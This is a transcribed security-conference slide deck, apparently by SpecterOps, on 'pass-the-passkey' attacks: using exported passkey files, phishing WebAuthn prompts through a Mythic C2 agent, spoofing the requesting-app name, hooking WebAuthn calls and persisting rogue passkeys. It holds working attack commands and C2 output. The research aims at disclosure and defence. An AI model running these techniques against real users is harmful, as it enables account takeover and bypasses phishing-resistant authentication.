| Title | Path | Username | Relying Party | URLs |
|---|---|---|---|---|
| webauthn.io (Passkey) | Root/KeePassXC-Browser Passkeys | john@webauthn.io | webauthn.io | https://webauthn.io webauthn.io |

☐ Show expired entries

Import   Export

**Export Confirmation**

The passkey file will be vulnerable to theft and unauthorized use, if left unsecured. Are you sure you want to continue?

Yes   No

## Slide 38

## **Bitwarden Vault Export**

Left sidebar: **bit**warden Password Manager — My vault, **All items** (expanded: Favorites, Login, Card, Identity, Secure note, SSH key), Archive (Upgrade), Trash, Folders, Send, Generator, Import, Export

**Export** dialog:

Exporting individual vault
Only the individual vault items associated with michael.grafnetter@outlook.com will be exported. Organization vault items will not be included. Only vault item information will be exported and will not include associated attachments.

File format (required): .json (Encrypted)

Export type:

- Account restricted — Use your account encryption key, derived from your account's username and Master Password, to encrypt the export and restrict import to only the current Bitwarden account.
- Password protected (selected) — Set a file password to encrypt the export and import it to any Bitwarden account using the password for decryption.

File password (required): •••••••••••• — strength meter: Strong
This password will be used to export and import this file

Confirm file password (required): ••••••••••••

Export   Cancel

## Slide 39

## **Credential Exchange Format (CXF)**

```json
{
    "id": "akKA3Y0jQRuK7sKplB0Y9w",
    "creationAt": 1705142400,
    "modifiedAt": 1705228800,
    "title": "WebAuthn.io",
    "subtitle": "johndoe",
    "credentials": [
        {
            "type": "passkey",
            "credentialId": "Y3JlZGVudGlhbElkRXhhbXBsZQ",
            "rpId": "webauthn.io",
            "username": "johndoe",
            "userDisplayName": "John Doe",
            "userHandle": "cnEzaNHWcYK3coWZjvoaV1Hj9gnI12mKe2dL2HZVFlY",
            "key": "MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgARu_0
            "fido2Extensions": {
                "hmacSecret": {
                    "algorithm": "HS256",
                    "secret": "c2VjcmV0X2tleV9kYXRh"
```

The `key` value and the closing braces run off the right and bottom edges of the code box on the slide.

## Slide 40

## **Passing the Synced Passkeys**

"Software Signer" window.

**Signature Parameters**

- Passkey File: `...s-the-passkey\Samples\bitwarden_encrypted_export_20260511125855.json`  [Browse...]
- Passkey: johndoe — dsO1yNiARuafV87QYGB1Vw
- Signature Counter: 5   ☑ User Verification (UV)   ☑ User Presence (UP)

**Credential Details**

| Field | Value |
|---|---|
| Algorithm | ECDSA |
| Key Type | P-256 |
| Key Length | 256 |
| Hash | SHA256 |
| Credential ID | dsO1yNiARuafV87QYGB1Vw |
| User Name | johndoe |
| User Handle | cnEzaNHWcYK3coWZjvoaV1Hj9gnI12mKe2dL2HZVFlY |

[Sign]

## Slide 41

# **DEMO**

**Passing the Synced Passkeys**

## Slide 42

# **Passkey Phishing Attack**

**Breaking the Phishing Resistance**

## Slide 43

## **Phishing Protection - Related Origin Requests (ROR)**

```text
michael@GRAY:~$ curl https://login.microsoft.com/.well-known/webauthn
{
  "origins": [
    "https://login.live.com",
    "https://login.microsoftonline.com"
  ]
}michael@GRAY:~$
```

## Slide 44

## **Passkey Phishing Attack – Prompt**

```text
PS > .\SharpPasskeys.exe prompt -r github.com -c 1IOBmIehGH8dZKXjxdSw_VHs5wxrI8HnoaxDAZS5 -a ClientDevice
19:13:33 info: Passkeys[0] Prompting for credentials with relying party 'github.com' and authenticator hint 'ClientDevice'...
```

"Windows Security" dialog:

- Sign in with a passkey
- MichaelGrafnetter — Passkey for github.com
- Hello, Michael! Select OK to continue.
- Sign-in options
- Choose a different passkey
- [OK]   [Cancel]

## Slide 45

## **Passkey Phishing Attack – Assertion Response**

```text
PS > .\SharpPasskeys.exe prompt -r github.com -c 1IOBmIehGH8dZKXjxdSw_VHs5wxrI8HnoaxDAZS5 -a ClientDevice
19:13:33 info: Passkeys[0] Prompting for credentials with relying party 'github.com' and authenticator hint 'ClientDevice'...
{"id":"kGExWOTJk3CV-igJrwoDrupadlREaz5hgV7LlucUDho","rawId":"kGExWOTJk3CV-igJrwoDrupadlREaz5hgV7LlucUDho","type":"public-key","authenticatorAttachment":"platform","response":{"authenticatorData":"OusAJGA4HG8ljoOV0wJvVx8NmnZIjc2DdjmxOu0xZWAFAAAAdQ","signature":"MEYCIQDOLcpbQALMB7KCK2Q_LCm49a5kcslDViuGIndN43Z1eQIhANlxSpG3VSuaZ8MJJDKXY8w64bwaiQEvYkBA7pEIkrUf","userHandle":"ji2vzjgdc4Jq8DRNjFc9_LhjyfF6mAN2YwYt8cA4KCV-Jr90NQ-7qJAg7LZ-zB6Gb7nGNT6a4MjZlXcuY9-Jsg","clientDataJSON":"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiMUlPQm1JZWhHSDhkWktYanhkU3dfVkhzNXd4ckk4SG5vYXhEQVpTNSIsIm9yaWdpbiI6Imh0dHBzOi8vZ2l0aHViLmNvbSIsImNyb3NzT3JpZ2luIjpmYWxzZX0"}}
PS >
```

## Slide 46

## **C2 Command Generation**

"C2 Commands" window.

Authenticator Type Hint: Windows Hello (Platform)   ☐ Prompt Flood   ☐ Kill Credential UI Broker   ☐ Spoof Window Handle

**SharpPasskeys (Standalone CLI)**

```text
SharpPasskeys.exe prompt --relying-party login.microsoft.com --authenticator ClientDevice --challenge Ty5leUowZVhBaU9pSktWMVFp
```

**SharpPasskeys (Mythic Apollo Agent)**

```text
register_assembly -existingFile SharpPasskeys.exe
execute_assembly -Assembly SharpPasskeys.exe -Arguments "prompt --relying-party login.microsoft.com --authenticator ClientDevice -
```

**PowerShell**

```text
Import-Module -Name DSInternals.Passkeys
Test-Passkey -RelyingPartyId login.microsoft.com -Hint ClientDevice -Challenge Ty5leUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpTVXpJ
```

[Close]

The `--challenge`/`-Challenge` values and the `execute_assembly` argument string run off the right edge of their text boxes on the slide.

## Slide 47

# **DEMO**

**Passkey Phishing Attack over C2 (Mythic + Apollo)**

## Slide 48

Browser: Mythic — `127.0.0.1:7443/new/callbacks` (Not Secure), zoom 120%.

**Callbacks**

| INTERACT | IP | HOST | USER | DOMAIN | PID | LAST CHECKIN | DESCRIPTION |
|---|---|---|---|---|---|---|---|
| 9 | 10.101.0.123 | CANARY | Admin | CANARY | 13196 | 1 seconds | Created by mythic_admin at 2026-04-02 13:21:36 |
| 5 | 172.26.128.1 | CONTOSO-PC1 | Admin | contoso | 11376 | 4 seconds | Created by mythic_admin at 2026-04-02 13:21:36 |

Tab: **C2 => WIN11**

Task log (left pane):

- `...ys.exe -Arguments prompt --relying-pa...` (scrolled off the top)
- [Fri May 15 2026 02:38 PM] / T-99 / mythic_admin: inline_assembly -Assembly SharpPasskeys.exe -Arguments prompt --relying-pa...
- [Fri May 15 2026 02:45 PM] / T-100 / mythic_admin: help
- [Fri May 15 2026 02:47 PM] / T-101 / mythic_admin: execute_assembly -Assembly SharpPasskeys.exe -Arguments prompt --relying-...
- [Fri May 15 2026 02:47 PM] / T-102 / mythic_admin: help
- [Fri May 15 2026 02:49 PM] / T-103 / mythic_admin: execute_assembly -Assembly SharpPasskeys.exe -Arguments list hello
- [Fri May 15 2026 02:49 PM] / T-104 / mythic_admin: screenshot
- [Fri May 15 2026 02:50 PM] / T-105 / mythic_admin: execute_assembly -Assembly SharpPasskeys.exe -Arguments prompt --relying-...
- [Fri May 15 2026 02:52 PM] / T-106 / mythic_admin: help

Selected task (right pane): [Fri May 15 2026 02:52 PM] / T-106 / mythic_admin / C-9 / `help`

```text
Command                    Description
=======                    ============
clear                      Usage: clear { | all | task Num}
                           Description: The 'clear' command will mark tasks as 'cleared' so that they can't be picked up by agents
assembly_inject            Usage: assembly_inject [pid] [assembly] [args]
                           Description: Inject the unmanaged assembly loader into a remote process. The loader will then execute the .NET binary in the context of the injected process.
download                   Usage: download -Path [path/to/file]
                           Description: Download a file off the target system.
execute_assembly           Usage: execute_assembly [Assembly.exe] [args]
                           Description: Executes a .NET assembly with the specified arguments. This assembly must first be known by the agent using the `register_assembly` command or by supplying an assembly with the task.
execute_pe                 Usage: execute_pe [PE.exe] [args]
                           Description: Executes an unmanaged executable with the specified arguments. This executable must first be known by the agent using the `register_file` command.
exit                       Usage: exit
                           Description: Task the implant to exit.
help                       Usage: help [command]
                           Description: The 'help' command gives detailed information about specific commands or general information about all available commands.
get_injection_techniques   Usage: get_injection_techniques
                           Description: List the currently available injection techniques the agent knows about.
```

Dir: `C:\Users\Admin\Downloads`

## Slide 49

## **Passkey Prompt Flooding Attack**

Meme image (Star Trek: Locutus / a Borg-assimilated Captain Picard) with caption:

RESISTANCE IS FUTILE.

## Slide 50

## **Passkey Phishing over RDP**

"Remote Desktop Connection" — Local Devices and Resources dialog.

**Local devices and resources**

Choose the devices and resources on this computer that you want to use in your remote session.

- ☑ Smart cards or Windows Hello for Business
- ☑ WebAuthn (Windows Hello or security keys)
- ☐ Ports
- ☐ Location
- ☐ Drives
- ☐ Video capture devices
- ☐ Other supported Plug and Play (PnP) devices

[OK]   [Cancel]

## Slide 51

## **Passkey Phishing from Hyper-V VM**

"CANARY on GRAY - Virtual Machine Connection" (Hyper-V), menu: File  Action  Media  View  Help.

Windows PowerShell:

```text
PS > .\SharpPasskeys.exe prompt --relying-party github.com --challenge QmFQclh3QUFBQURTQkZoZzczeExFUVo2c0dNVndx
12:20:19 info: Passkeys[0] Prompting for credentials with relying party 'github.com' and authenticator hint 'None'...
```

"Windows Security" dialog:

- Sign in with a passkey
- MichaelGrafnetter — Passkey for github.com
- Scan your finger on the fingerprint reader.
- Sign-in options
- Choose a different passkey
- [Cancel]

Status: Running

## Slide 52

# **Passkey Phishing Attack**

**Application Identifier Spoofing**

## Slide 53

## **Application Identifier**

"Windows Security" dialog:

- Sign in with a passkey
- satya@microsoft.com — Passkey for login.microsoft.com
- **Requested by PasskeyUI (Michael Grafnetter)** (highlighted in red on the slide)
- Scan your finger on the fingerprint reader.
- Sign-in options
- Choose a different passkey
- [Cancel]

## Slide 54

## **Application Identifier Spoofing – HWND Injection**

Windows PowerShell:

```text
PS > Get-Process -Name msedge | Where-Object MainWindowHandle -ne 0 | Format-Table -Property MainWindowHandle,Name

MainWindowHandle Name
---------------- ----
        12262062 msedge

PS > .\Passkeys.exe prompt --relying-party github.com --hwnd 12262062 --challenge DVcoAwqLUHHcV0maTPQJegMIGYuWdxhFju6yq2K0LGU
11:09:41 info: Passkeys[0] Using provided window handle 12262062.
11:09:41 info: Passkeys[0] Prompting for credentials with relying party 'github.com' and authenticator hint 'None'...
```

(The `--hwnd 12262062` argument is highlighted in a red box on the slide.)

Edge browser at `https://www.microsoft.com/en-us` (tab "Microsoft – AI, Cloud, Productivity"). "Windows Security" dialog:

- Sign in with a passkey
- MichaelGrafnetter — Passkey for github.com
- **Requested by Microsoft Edge (Microsoft Corporation)** (highlighted in red on the slide)
- Scan your finger on the fingerprint reader.
- Sign-in options
- Choose a different passkey
- [Cancel]

## Slide 55

## **Application Identifier Spoofing – Version Info Struct**

"PasskeyUI.exe Properties" dialog, **Details** tab (tabs: General, Compatibility, Digital Signatures, Security, Details, Previous Versions).

| Property | Value |
|---|---|
| File description | PasskeyUI |
| Type | Application |
| File version | 3.0.0.0 |
| Product name | PasskeyUI |
| Product version | 1.0.0+d7054dbc4d21f32d35877b04f63cd... |
| Copyright | Copyright (c) 2021-2026 Michael Grafnett... |
| Size | 130 MB |
| Date modified | 5/10/2026 12:04 AM |
| Language | Language Neutral |
| Original filename | PasskeyUI.dll |

Remove Properties and Personal Information

[OK]   [Cancel]   [Apply]

## Slide 56

## **Application Identifier Spoofing – Version Info Struct**

Project file (`.csproj`):

```xml
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>WinExe</OutputType>
    <AssemblyTitle>Microsoft Edge</AssemblyTitle>
    <Authors>Microsoft Corporation</Authors>
    <TargetFramework>net10.0-windows</TargetFramework>
```

(The `<AssemblyTitle>` and `<Authors>` lines are boxed in red, with an arrow pointing to the "Requested by" line in the dialog.)

"Windows Security" dialog:

- Sign in with a passkey
- satya@microsoft.com — Passkey for login.microsoft.com
- **Requested by Microsoft Edge (Microsoft Corporation)** (highlighted in red on the slide)
- Hello, Michael! Select OK to continue.
- Sign-in options
- Choose a different passkey
- [OK]   [Cancel]

## Slide 57

# **Passkey Detour Attack**

**WebAuthn API Hooking**

## Slide 58

PASSKEY DETOUR ATTACK

## **Modes of Operation**

#### **Assertion Replay**

- Both attacker and victim are logged in
- Uses victim challenge
- Relying party lacks challenge replay protection
- Works against Microsoft Entra

#### **Assertion Capture**

- Attacker is logged in
- Victim sees transient error
- Uses victim challenge
- Relying party has challenge replay protection
- Works against most web applications

#### **Challenge Injection**

- Attacker is logged in
- Victim sees transient error
- Uses attacker challenge
- Relying party binds challenges to sessions
- Works against GitHub

## Slide 59

# **DEMO**

**Passkey Detour Attack (Assertion Capture Mode)**

## Slide 60

# **DEMO**

**Passkey Detour Attack (Challenge Injection Mode)**

## Slide 61

# **Miscellaneous Passkey Attacks**

## Slide 62

## **Evil Authenticator Plugin Attack – Registration**

Windows **Settings** — Accounts > Passkeys > Advanced options (account: Michael, Local Account).

**Passkey managers**

- 100% Legit Passkey Manager — SpecterOps, Inc. — On
- 1Password — AgileBits Inc. — On

Save passkeys to this Windows device — On

Get help

Left navigation: Home, System, Bluetooth & devices, Network & internet, Personalization, Apps, **Accounts** (selected), Time & language, Gaming, Accessibility

## Slide 63

## **Evil Authenticator Plugin Attack – Credential UI**

"Windows Security" dialog — Choose where to save your passkey:

- 100% Legit Passkey Manager
- 1Password
- This Windows device
- iPhone, iPad, or Android device
- Security key
- [Cancel]

## Slide 64

## **Request Tampering Attack (UV and UP Bypass)**

"Passkey UI" window, **Authentication** tab (menu: Load Default Options, Help; tabs: Windows API Information, Registration, Authentication, Platform Credentials, Authenticators, Event Log).

**Assertion Options**

- Relying party: login.microsoft.com
- U2F AppID: (empty)
- Authenticator: Any
- Credential hint: None
- Remote web origin: (empty)
- User verification: **Discouraged** — dropdown open (Any, Required, Preferred, Discouraged)
- Large blob operation: None
- ☐ Get credential blob
- ☐ Browser in private mode
- Timeout: 120 s
- Generate challenge
- Challenge: a long base64url value (the left portion of its first lines is hidden behind the open User verification dropdown)
- Large blob: (empty)
- HMAC secret salt 1: (empty) [Generate]
- HMAC secret salt 2: (empty) [Generate]

[Authenticate]   [Sign with File]

## Slide 65

## **Assertion Fuzzing Attack**

```json
{
  "authenticatorAttachment": "platform",
  "clientExtensionResults": {},
  "id": "5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM",
  "rawId": "5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM",
  "response": {
    "authenticatorData": "NWye1KCTIblpXx6vkYID8bVfaJ2mH7yWGEwVfdpoDIEFAAAAAg",
    "clientDataJSON": "eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiVHk1bGVVb3daVmhCYVU5cFNrdFdNVkZwVEVOS2FHSkhZMmxQYVVwVFZYcEpNVTVwU1hOSmJtY3haRU5KTmtsc1FtcFhSR3MwVWpGbk1FMXFRbFZOVm1jeVl6QktSV0V6Y0c5VlZ6RjRXak5rVGxaVFNqa3VaWGxLYUdSWFVXbFBhVW94WTIwME5tSlhiR3BqYlRsNllqSmFNRTl0V25CYVJ6ZzJXVEpvYUdKSGVHeGliV1JzU1dsM2FXRllUbnBKYW05cFlVaFNNR05JVFRaTWVUbHpZakprY0dKcE5YUmhWMDU1WWpOT2RscHVVWFZaTWpsMFNXbDNhV0ZYUmpCSmFtOTRUbnBhTkU5VVZYaE5WRTE1VEVOS2RWbHRXV2xQYWtVelRtcG5OVTVVUlhoTmVrbHpTVzFXTkdORFNUWk5WR015VDBSck1VMVVVWHBOYmpBdVNEQnhOb1JwZFZwdFMwcEhkMlZuWldobGRrd3pjR3hpU1UxWVUwMWFTSFpaYkhocmRtdEtVSEZQU3pWR2FXZExjR1ZHTkVzMFh6VjRjVnBvWlZsWVozZDZNa05zWkdGTWF6UTBaRUozWDNKUU9FMXNWRWR1TWxsUk9YRlViR1EyZFVKVGVHbGFkM0JzU3pGSE9EaGlNalJRVW5WUGJGODFNWFpKV0dGVU5XRkJUbVZDUm5GUGQzUlBXbDlZY0VSa1kwVXdiMjlXWkhKMGJYZGZZbU5zYVVwR1ltRjZiVzlzTUdFdFN6WlhNVzVSWHpSVVkweGZZa3gxZFZoeVNHVnRRall4Vlc5aU1VMHpXakpwY21zNWQyZzFWemhhYTNVMFVHYzRibkp5ZERobmNtaHlaRXhpY0ZCTVRVNHdjakUxUlcxaFZVUTNRVmR6Y0dnM1gydG9kMHcyTm1oMGFtbGhPR295Um04dFNYSkZUeTFtWm01T1NWZGFaSFV0Tm1acGNYaHdia1paVDI5R1JsQjJXamRKUXpOaFoyaGlVSGhtWXpCWk1GWklabXhyWkU5bFoweG1jVEo0UVZkblVHdzViRU5uVEhkbiIsIm9yaWdpbiI6Imh0dHBzOi8vbG9naW4ubWljcm9zb2Z0LmNvbSIsImNyb3NzT3JpZ2luIjpmYWxzZX0",
    "signature": "MEUCIA8EKq1vxqcXzZmXR55iX_Joodr_4r8PBvBk0v03iKhaAiEA_2A1_0WHAjZFPMwJH0P1YjqPSz71Vxe9iX4lIco29tc",
    "userHandle": "0XqaPaVaRbsMVE6St7IOaVDB8oVhpNBZ2_w-FNSiemw"
  },
  "type": "public-key"
}
```

## Slide 66

## **Passkey Persistence Attack – Entra ID + Okta**

PowerShell:

```powershell
PS C:\> Connect-MgGraph -Scopes 'UserAuthenticationMethod.ReadWrite.All' -TenantId dev.dsinternals.com -NoWelcome
PS C:\> Register-Passkey -UserId AdeleV@dev.dsinternals.com -DisplayName 'YubiKey C Bio Primary'
```

"Windows Security" dialog — Choose where to save this passkey:

- Security key

More choices:

- iPhone, iPad, or Android device
- Security key

[Next]   [Cancel]

## Slide 67

# **Summary**

**Pass-the-Passkey Family of Attacks**

## Slide 68

## **Pass-the-Passkey Attacks – OS Layer**

Drake "hotline bling" meme:

- Rejecting: **Pass-the-Hash** (kiwi fruit icon)
- Approving: **Pass-the-Passkey** (person-with-key icon)

## Slide 69

## **Pass-the-Passkey Attack Tooling**

Flow diagram.

**Relying Party** (Passkey Authentication) — top of the diagram.

**Compromised Computer A** contains:

- **Passkey Authenticators**: Windows Hello, YubiKey, iPhone
- **Web Browser**
- **C2 Agent** (SharpPasskeys.exe)
- **WebAuthn Prompt** (Bio / PIN / QR)

**Compromised Computer B** contains:

- **Exported Passkey Files** (KeePassXC / Bitwarden / CXF)
- **Windows Event Log** (Microsoft-Windows-WebAuthN/Operational)

**Operator's Computer** contains:

- **Desktop App** (PasskeyInjector.exe)

Connections (labelled arrows):

- Web Browser → Relying Party: HTTPS
- C2 Agent → Web Browser: WebAuthn API hooking
- WebAuthn Prompt → Windows Hello / YubiKey (invokes the authenticators)
- C2 Agent ↔ WebAuthn Prompt: WebAuthn phishing
- C2 Agent ↔ Desktop App: C2 channel
- Desktop App → Relying Party: HTTPS
- Exported Passkey Files → Desktop App: Synced passkeys
- Windows Event Log → Desktop App: Replayable assertions

## Slide 70

## **Key Takeaways**

1. Passkeys remain worth adopting because attacks are harder than passwords.
2. Endpoint compromise and flaws can bypass phishing-resistant MFA.
3. Test passkey implementations for replay, relay, and tampering.
4. Visit https://github.com/SpecterOps/pass-the-passkey for details.

## Slide 71

SpecterOps — Creators of BloodHound

